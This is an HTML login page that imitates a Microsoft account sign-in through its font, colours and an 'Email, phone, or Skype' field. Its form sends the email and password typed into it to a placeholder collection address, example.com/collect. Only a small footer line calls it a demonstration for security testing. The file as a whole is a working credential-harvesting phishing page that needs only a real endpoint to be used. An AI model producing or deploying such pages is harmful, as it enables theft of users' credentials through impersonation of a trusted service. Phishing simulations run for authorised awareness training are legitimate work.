<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in to your account</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Segoe+UI:400,600&display=swap">
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #f3f2f1;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 40px;
      box-shadow: 0 0 10px rgba(0,0,0,0.15);
      border-radius: 8px;
      width: 100%;
      max-width: 360px;
    }
    .login-box h2 {
      margin-bottom: 20px;
      font-weight: 400;
      font-size: 20px;
      color: #333;
    }
    input[type="email"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #0078d4;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
    }
    .note {
      margin-top: 20px;
      font-size: 12px;
      color: #888;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Sign in to your account</h2>
    <form action="https://example.com/collect" method="POST">
      <input type="email" name="email" placeholder="Email, phone, or Skype" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Sign in</button>
    </form>
    <div class="note">This is a demonstration login page for security testing purposes only.</div>
  </div>
</body>
</html>
